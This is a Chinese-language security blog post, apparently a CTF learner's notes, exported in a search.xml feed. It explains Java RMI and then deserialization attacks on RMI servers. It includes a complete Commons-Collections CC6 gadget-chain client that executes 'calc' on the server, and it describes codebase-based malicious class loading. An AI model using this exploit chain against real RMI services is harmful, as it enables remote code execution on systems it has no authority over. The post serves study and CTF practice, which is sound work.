<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/2024/07/18/RMI-JNDI/"/>
    <url>/2024/07/18/RMI-JNDI/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先了解一下啥是RMI。</p><p><code>RMI：Remote Method Invocation</code> 远程方法调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">RMI为应用提供了远程调用的接口（Java的RPC框架）<br>调用远程位置对象的方法<br>实现RMI的协议叫JRMP<br>RMI实现过程存在Java对象的传递，因此涉及到反序列化<br></code></pre></td></tr></table></figure><p>基本上从java反序列化取经出来，遇到且绕不开的应该是各个CC链，而且很多的java反序列化非常具有缝合怪的风格，在前期学业压力下没办法系统归纳，知识也零零散散，这里就做一个系统化的复盘。</p><p>但是CC链太具有代表性了，所以我想先写写我第一次打到java题的时候遇到的RMI&#x2F;JNDI问题，就是NCTF2023的logging签到题，那道log4j虽然很简单地打accept头就能RCE，但是起的工具也就是JNDI注入的工具，所以让我记忆犹新。</p><p>然而光靠工具小子当然是不能解决问题的，大多是的EXP都是现场动调而手导手写，而且线下断网环境注定不能反弹shell而则必须使用内存马也使得java在web题内最少解的情况，国赛也遇到了触目惊心的零解。反射和类加载我就不再赘述，因为这算是最基本的java反序列化入门知识。</p><p>为屏蔽网络通信的复杂性，RMI引入两个概念，客户端存根Stub和服务端骨架Skeleton</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">当<span class="hljs-variable">Client</span>试图调用一个远端的<span class="hljs-variable">Object</span>，实际调用的是客户端本地的一个代理类（就是<span class="hljs-built_in">Stub</span>）<br><br>调用<span class="hljs-variable">Server</span>的目标类之前，会经过一个远端代理类（就是<span class="hljs-built_in">Skeleton</span>），它从<span class="hljs-built_in">Stub</span>接收远程方法调用并传递给真正的目标类<br><br><span class="hljs-built_in">Stub</span>和<span class="hljs-built_in">Skeleton</span>的调用对于<span class="hljs-variable">RMI</span>服务的使用者是隐藏的<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/1.png" alt="1"></p><p><img src="/2024/07/18/RMI-JNDI/2.png" alt="2"></p><p><strong>代码规则</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">客户端和服务端都需定义用于远程调用的接口<br><br>接口必须继承`java.rmi.Remote`接口<br><br>接口中的方法都要抛出`java.rmi.RemoteException`异常<br><br>服务端创建接口实现类，实现接口定义的方法<br><br>实现类继承`java.rmi.server.UnicastRemoteObject`<br></code></pre></td></tr></table></figure><p>这里要求实现类继承<code>UnicastRemoteObject</code>，方便自动将这个远程对象导出供客户端调用</p><p>当然不继承也行，但后面得手动调用<code>UnicastRemoteObject#exportObject</code>，导出对象时可以指定监听端口来接收<code>incoming calls</code>，默认为随机端口。由上图可知远程对象会被注册到<code>RMI Registry</code>中，所以实际上不需要通过注册中心，只要我们知道导出的远程对象监听的端口号，也可以和它直接通信。</p><p><code>RMI Registry</code>注册中心存储着远程对象的引用（Reference）和其绑定的名称（Name），客户端通过名称找到远程对象的引用（Reference），再由这个引用就可以调用到远程对象了。</p><h2 id="步骤代码"><a href="#步骤代码" class="headerlink" title="步骤代码"></a>步骤代码</h2><p><strong>Server</strong></p><p>需要远程调用的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>接口实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteInterface</span> &#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello My Friend&quot;</span>;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> name.getClass().getName();<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bye&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们通常使用 <code>LocateRegistry#createRegistry()</code> 方法来创建注册中心：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Registry</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>System.out.println(<span class="hljs-string">&quot;Server Start&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后将待调用的类进行绑定：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteServer</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;<br><span class="hljs-comment">// 创建远程对象</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br><span class="hljs-comment">// 绑定</span><br>Naming.bind(<span class="hljs-string">&quot;rmi://localhost:1099/Hello&quot;</span>, remoteObject);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以直接整合到Server处注册远程对象，使用<code>LocateRegistry#createRegistry()</code>来创建注册中心，<code>Registry#bind()</code>进行绑定：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, remoteObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、接触绑定（unbind）、list（列表）用来对注册表进行操作。也就是说，Naming 是一个用来对注册表进行操作的类。而这些方法的具体实现，其实是调用 <code>LocateRegistry.getRegistry</code> 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的。</p><p>这些方法的第一个参数都接收一个URL字符串，<code>rmi://host:port/name</code>，表示注册中心所在主机和端口，远程对象引用的名称。</p><p>一般注册中心和服务端都在同一主机。</p><p><strong>Client</strong></p><p>客户端也需要定义和服务端相同的远程接口，然后进行调用：</p><p><code>LocateRegistry#getRegistry()</code>连接注册中心，<code>Registry#lookup()</code>获取远程对象的存根，通过名称查找。注册中心默认端口1099</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br><span class="hljs-comment">// sun.rmi.registry.RegistryImpl_Stub</span><br><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>System.out.println(Arrays.toString(registry.list()));<br><span class="hljs-comment">// lookup and call</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (RemoteInterface) registry.lookup(<span class="hljs-string">&quot;Hello&quot;</span>);<br>System.out.println(stub.sayHello());<br>System.out.println(stub.sayGoodbye());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里 RemoteInterface 接口在 Client&#x2F;Server&#x2F;Registry 均应该存在，只不过通常 Registry 与 Server 通常在同一端上。</p><p>RMI支持动态类加载来进行反序列化。上面的远程方法调用涉及方法参数的传递，若客户端传递了一个服务端不存在的类对象，服务端如何进行反序列化呢？</p><p>最后还有个小trick，首先是动态类加载，如果客户端在调用时，传递了一个可序列化对象，这个对象在服务端不存在，则在服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，若设置了<code>java.rmi.server.codebase</code>，则服务端会尝试从其地址获取 <code>.class</code> 并加载及反序列化。加载字节码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.setProperty(<span class="hljs-string">&quot;java.rmi.server.codebase&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>所以，打反序列化的时候，恶意Server端可以如此存放恶意class字节码，让Client来调用从而RCE。</strong></p><p>可使用 <code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:9999/&quot;);</code> 进行设置，或使用启动参数 <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot;</code> 进行指定。</p><p>接下来就是安全策略的设置，因为我们通过网络加载外部类并执行方法，所以我们必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类，通常我们使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>) &#123;<br>    System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RMISecurityManager</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>管理器应与管理策略相辅相成，所以我们还需要提供一个策略文件，里面配置允许那些主机进行哪些操作，这里为了方便测试，直接设置全部权限：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">grant &#123;<br>    permission java.security.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><p>同样可以使用 <code>-Djava.security.policy=rmi.policy</code> 或 <code>System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());</code> 来进行设置。</p><h2 id="RMI底层原理总结"><a href="#RMI底层原理总结" class="headerlink" title="RMI底层原理总结"></a>RMI底层原理总结</h2><p>对于更底层部分的分析我就不献丑，网上很多大牛都写得很透彻清晰，这里我就只写写RMI-Attack行为了。</p><p>底层原理可以总结为（借用su18佬的图图）：</p><p><img src="/2024/07/18/RMI-JNDI/3.png" alt="3"></p><p>总而言之，RMI 底层通讯采用了Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>、RMI 客户端在调用远程方法时会先创建 Stub ( sun.rmi.registry.RegistryImpl_Stub )。<br><span class="hljs-number">2</span>、Stub 会将 Remote 对象传递给远程引用层 ( java.rmi.server.RemoteRef ) 并创建 java.rmi.server.RemoteCall( 远程调用 )对象。<br><span class="hljs-number">3</span>、RemoteCall 序列化 RMI 服务名称、Remote 对象。<br><span class="hljs-number">4</span>、RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。<br><span class="hljs-number">5</span>、RMI服务端的远程引用层( sun.rmi.server.UnicastServerRef )收到请求会请求传递给 Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )。<br><span class="hljs-number">6</span>、Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。<br><span class="hljs-number">7</span>、Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。<br><span class="hljs-number">9</span>、RMI 客户端反序列化服务端结果，获取远程对象的引用。<br><span class="hljs-number">10</span>、RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。<br><span class="hljs-number">11</span>、RMI 客户端反序列化 RMI 远程方法调用结果。<br></code></pre></td></tr></table></figure><h2 id="RMI-Attack"><a href="#RMI-Attack" class="headerlink" title="RMI-Attack"></a>RMI-Attack</h2><p>这里我觉得su18佬的电话本比喻很恰当也很易懂，Java RMI 设计了一个 Registry 的思想，很好理解，我们可以使用注册表来查找一个远端对象的引用，更通俗的来讲，这个就是一个 RMI 电话本。</p><p>我们想在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称 （Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object）。</p><p>参与一次 RMI 调用的有三个角色，分别是 Server 端，Registry 端和 Client 端。严格意义上来讲，只有 Registry 端和使用 Registry 的端，因为 Registry 端只负责查询和传递引用，真正的方法调用是不需要经过 Registry 端的，只不过注册服务的我们称之为 Server 端，使用服务的我们称之为 Client 端。</p><p><strong>有一种我只负责帮你找到人，至于你找这个人做什么非法勾当我不管的感觉</strong>，不过为了更清晰的划分不同角色，我们还是将其分为三个角色，而通常情况下，Server 端和 Registry 端是同一端。</p><p>RMI调用过程决定了三者都涉及反序列化操作，所以对这三者的攻击就呼之欲出。</p><p>大概分这几种：</p><ol><li>攻击客户端<ul><li>RegistryImp_Stub#lookup 反序列化注册中心返回的Stub</li><li>UnicastRef#invoke 反序列化远调方法的执行结果</li><li>StreamRemoteCall#executeCall 反序列化远程调用返回的异常类</li><li>DGCImpl_Stub#dirty</li></ul></li><li>攻击服务端<ul><li>UnicastServerRef#dispatch 反序列化客户端传递的方法参数</li><li>DGCImpl_Skel#dispatch</li></ul></li><li>攻击注册中心<ul><li>RegistryImp_Stub#bind 注册中心反序列化服务端传递传来的远程对象</li></ul></li></ol><h3 id="Server-端-Attack"><a href="#Server-端-Attack" class="headerlink" title="Server 端 Attack"></a>Server 端 Attack</h3><h4 id="恶意服务参数"><a href="#恶意服务参数" class="headerlink" title="恶意服务参数"></a>恶意服务参数</h4><p>这里需要一个背景，当 Client 端获取到 Server 端创建的 Stub 后，Client 会在本地调用这个 Stub 并传递参数，Stub 会序列化这个参数并传递给 Server 端，<strong>Server 端就会反序列化 Client 端传入的参数并进行调用</strong>，如果这个参数是 <strong>Object 类型</strong>的情况下，Client 端可以传给 Server 端<strong>任意的类</strong>，直接造成反序列化漏洞。</p><p>例如我们上面写的在远程调用接口 RemoteInterface 存在一个传入Object类型的<code>sayGoodbye</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>那就直接可以传一个反序列化 payload 进去执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>);<br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (Hello) r.lookup(<span class="hljs-string">&quot;hello&quot;</span>);<br>        stub.sayHello(getPayload());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-keyword">return</span> expMap;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>CC6直接弹calc。</p><p>如果参数类型不是 Object 类型，那能否进行攻击？</p><p>当然可以。</p><p>这里可以看一个小实验，我们在Server的接口处若使用<code>HelloObject</code>作为函数参数，Client的接口使用<code>Object</code>作为函数参数：</p><p>Server：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HelloObject name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样若想直接触发反序列化洞会报错：</p><p><img src="/2024/07/18/RMI-JNDI/4.png" alt="4"></p><p>其实可以看出，就是在服务端没有找到对应的调用方法。可以发现这个调用方法在 UnicastServerRef 的 <code>dispatch</code> 方法中在 <code>this.hashToMethod_Map</code> 中通过 Method 的 hash 来查找。</p><p>这个 hash 实际上是一个基于方法签名的 SHA1 hash 值。</p><p>那有没有一种可能，<strong>我们传递的是 Server 端能找到的参数是 HelloObject 的 Method 的 hash，但是传递的参数却不是 HelloObject 而是恶意的反序列化数据（可能是 Object或其他的类）呢？</strong></p><p>答案是可以的，在 mogwailabs 的 [PPT](<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides">https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) 中提出了以下 4 种方法：</p><ul><li>通过网络代理，在流量层修改数据</li><li>自定义 “java.rmi” 包的代码，自行实现</li><li>字节码修改</li><li>使用 debugger</li></ul><p>并且在 PPT 中还给出了 hook 点，那就是动态代理中使用的 RemoteObjectInvocationHandler 的 <code>invokeRemoteMethod</code> 方法。</p><p>客户端的接口也添加一个同服务端相同的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 